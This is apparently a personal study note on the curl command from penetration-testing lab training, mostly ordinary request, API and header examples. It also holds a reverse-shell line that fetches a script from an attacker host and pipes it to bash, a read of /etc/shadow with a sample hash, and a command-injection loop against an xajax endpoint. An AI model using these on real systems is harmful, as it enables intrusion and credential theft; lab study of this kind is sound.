# ⚙️ curl

Tags: #⚙️
Related to:
See also: [[wget]]
Previous: [[Web Requests]], [[JavaScript Deobfuscation]], [[Hacking Wordpress]], [[Getting Started]], [[Footprinting]]

## Description

Transfer a URL. Short for 'client url'.

## Usage Examples

### Cheatsheets

| **Command** | **Description** |
| --------------|-------------------|
| `curl -h` | cURL help menu |
| `curl inlanefreight.com` | Basic GET request |
| `curl -s -O inlanefreight.com/index.html` | Download file |
| `curl -k https://inlanefreight.com` | Skip HTTPS (SSL) certificate validation |
| `curl inlanefreight.com -v` | Print full HTTP request/response details |
| `curl -I https://www.inlanefreight.com` | Send HEAD request (only prints response headers) |
| `curl -i https://www.inlanefreight.com` | Print response headers and response body |
| `curl https://www.inlanefreight.com -A 'Mozilla/5.0'` | Set User-Agent header |
| `curl -u admin:admin http://<SERVER_IP>:<PORT>/` | Set HTTP basic authorization credentials |
| `curl  http://admin:admin@<SERVER_IP>:<PORT>/` | Pass HTTP basic authorization credentials in the URL |
| `curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/` | Set request header |
| `curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'` | Pass GET parameters |
| `curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/` | Send POST request with POST data |
| `curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/` | Set request cookies |
| `curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php` | Send POST request with JSON data |

#### APIs

| **Command** | **Description** |
| --------------|-------------------|
| `curl http://<SERVER_IP>:<PORT>/api.php/city/london` | Read entry |
| `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ \| jq` | Read all entries |
| `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Create (add) entry |
| `curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Update (modify) entry |
| `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` | Delete entry |

## Usage Examples

### Certificate transparency

	curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .

### Get help by man page category

```shell-session
 auth        Different types of authentication methods
 connection  Low level networking operations
 curl        The command line tool itself
 dns         General DNS options
 file        FILE protocol options
 ftp         FTP protocol options
 http        HTTP and HTTPS protocol options
 imap        IMAP protocol options
 misc        Options that don't fit into any other category
 output      Filesystem output
 pop3        POP3 protocol options
 post        HTTP Post specific options
 proxy       All options related to proxies
 scp         SCP protocol options
 sftp        SFTP protocol options
 smtp        SMTP protocol options
 ssh         SSH protocol options
 telnet      TELNET protocol options
 tftp        TFTP protocol options
 tls         All TLS/SSL related options
 upload      All options for uploads
 verbose     Options related to any kind of command line output of curl
```

	curl --help ssh

```shell-session
Usage: curl [options...] <url>
ssh: SSH protocol options
     --compressed-ssh Enable SSH compression
     --key <key>      Private key file name
     --pass <phrase>  Pass phrase for the private key
```

### Grab website banner

	curl -IL https://www.inlanefreight.com	

### Get reverse shell

	http://10.129.171.59/templates/protostar/htb.php?pwn=curl 10.10.17.201/reverse_shell.sh | bash

### Get local file

	curl file:///etc/shadow

```shell-session
floris:$6$yl7KKyGaOhVExlCb$ONJceChbI7srpLlJ/AhCLgESU7E4gXexPVgsJMjvQ0hP.6fwslfwWmD15cuaYs9./Jin4e/4LURPgEBav4iv//:17673:0:99999:7:::
```

### Send exploit through proxy using -x flag to see what it's doing:

Modify source code to run through proxy:

```bash
#!/bin/bash
URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl -x 'http://127.0.0.1:8080' --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Here's how the script works:

	curl
	xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E	// payload
	echo \"BEGIN\";${cmd};echo \"END\"	// echo BEGIN and END between the command we run
	sed -n -e '/BEGIN/,/END/ p'			// it send that to sed and grabs everything between BEGIN and END

### Follow redirects

	curl L https://www.inlanefreight.com

### Authenticate with cookie and send POST request to retrieve json data

	curl -X POST -d '{"search":"flag"}' -H 'Cookie: PHPSESSID=6eaubqoi86fevu4knlpi2cg7e3' -H 'Content-Type: application/json' 'http://<IP>:<port>/search.php'

```shell-session
["flag: HTB{  }"]
```

### Format json responses

#### Get raw json

	curl http://<SERVER_IP>:<PORT>/api.php/city/london

```shell-session
[{"city_name":"London","country_name":"(UK)"}]
```

#### Get formatted json

	curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq

```shell-session
[
  {
    "city_name": "London",
    "country_name": "(UK)"
  }
]
```

### Get header silently

301 Moved Permanently:

	curl -s -I -X GET http://blog.inlanefreight.com/?author=1

```shell-session
HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:47:08 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Redirect-By: WordPress
Location: http://blog.inlanefreight.com/index.php/author/admin/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

404 Not Found:

	curl -s -I -X GET http://blog.inlanefreight.com/?author=100

```shell-session
HTTP/1.1 404 Not Found
Date: Wed, 13 May 2020 20:47:14 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

### Log in to IMAPS service

	curl -k 'imaps://<FQDN/IP>' --user <user>:<password>

# References